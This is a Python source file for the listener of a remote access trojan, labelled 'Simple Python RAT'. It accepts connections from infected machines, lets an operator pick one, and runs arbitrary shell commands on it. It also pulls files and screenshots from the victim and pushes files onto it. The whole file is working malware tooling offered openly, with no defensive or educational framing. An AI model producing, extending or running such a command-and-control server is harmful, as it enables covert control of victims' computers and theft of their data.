#!/usr/bin/env python3
# !}============================================================================{!
# !} Simple Python RAT - listener                                             {!
# !} Author: luscious8                                                          {!
# !}============================================================================{!

import os
import socket
import sys
import time

BANNER = r"""

              simple python remote shell   |   luscious8
"""

CLEAR_CMD = "cls" if os.name == "nt" else "clear"
EOF = b"EOFEOFX"
CHUNK = 4096


def clear():
    os.system(CLEAR_CMD)


def recv_file(sock, path):
    """Client se EOFEOFX tak file receive karo."""
    sock.settimeout(None)
    data = b""
    while True:
        chunk = sock.recv(CHUNK)
        if not chunk:
            break
        if chunk.endswith(EOF):
            data += chunk[:-len(EOF)]
            break
        data += chunk
    with open(path, "wb") as f:
        f.write(data)
    return len(data)


def main():
    print(BANNER)

    host = input("host: ").strip() or "0.0.0.0"
    port = int(input("port: ").strip() or "4444")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(100)

    clients = []
    interval = 0.8

    print("\nListening for clients.....\n")

    while True:
        try:
            server.settimeout(4)
            try:
                s, a = server.accept()
            except socket.timeout:
                s = None

            if s is not None:
                s.settimeout(None)
                clients.append((s, "%s:%s" % (a[0], a[1])))

            clear()
            print("\nlistening for clients....\n")
            for j, (_, name) in enumerate(clients):
                print("[%d] client: %s\n" % (j + 1, name))
            if clients:
                print("press ctrl+C to interact with client.")
            time.sleep(interval)

        except KeyboardInterrupt:
            clear()
            print("\nlistening for clients....\n")
            for j, (_, name) in enumerate(clients):
                print("[%d] client: %s\n" % (j + 1, name))
            print("...\n[0] Exit\n")

            try:
                choice = input("\nEnter option: ").strip()
            except (EOFError, KeyboardInterrupt):
                continue
            if choice == "":
                continue
            try:
                pick = int(choice)
            except ValueError:
                continue
            if pick == 0:
                print("\nExiting....\n")
                sys.exit()

            idx = pick - 1
            if idx < 0 or idx >= len(clients):
                continue

            sock, name = clients[idx]
            clear()
            print("activating client %s\n" % name)

            try:
                sock.sendall(b"dir")
                data = sock.recv(5000)
                if data:
                    print(data.decode(errors="replace"))
            except OSError:
                clients.pop(idx)
                continue

            # ---------- interactive loop ----------
            while True:
                try:
                    cmd = input("shell$ ").strip()
                except (EOFError, KeyboardInterrupt):
                    print()
                    break

                if cmd == "":
                    sock.sendall(b"dir")
                    try:
                        print(sock.recv(5000).decode(errors="replace"))
                    except OSError:
                        break
                    continue

                try:
                    sock.sendall(cmd.encode())
                except OSError:
                    print("client disconnected")
                    break

                low = cmd.lower()

                # ---- download / pic ----
                if low.startswith("download") or low.startswith("pic"):
                    parts = cmd.split(maxsplit=1)
                    if len(parts) < 2:
                        print("usage: download <file>")
                        continue
                    local = parts[1].strip()
                    try:
                        n = recv_file(sock, local)
                        print("file downloaded: %s (%d bytes)" % (local, n))
                    except OSError as exc:
                        print("download failed:", exc)
                    continue

                # ---- upload ----
                if low.startswith("upload"):
                    parts = cmd.split(maxsplit=1)
                    if len(parts) < 2:
                        print("usage: upload <file>")
                        continue
                    local = parts[1].strip()
                    if not os.path.isfile(local):
                        print("invalid file:", local)
                        sock.sendall(EOF)
                        continue
                    with open(local, "rb") as f:
                        while True:
                            chunk = f.read(CHUNK)
                            if not chunk:
                                break
                            sock.sendall(chunk)
                    sock.sendall(EOF)
                    print("file sent: %s" % local)
                    continue

                # ---- normal command ----
                try:
                    data = sock.recv(5000)
                except OSError:
                    break
                if not data:
                    print("client disconnected")
                    break

                print(data.decode(errors="replace"))

                if data.startswith(b"Exit"):
                    print("client sent Exit - returning to listener mode")
                    break

            clear()
            print("\nlistening for clients....\n")


if __name__ == "__main__":
    main()
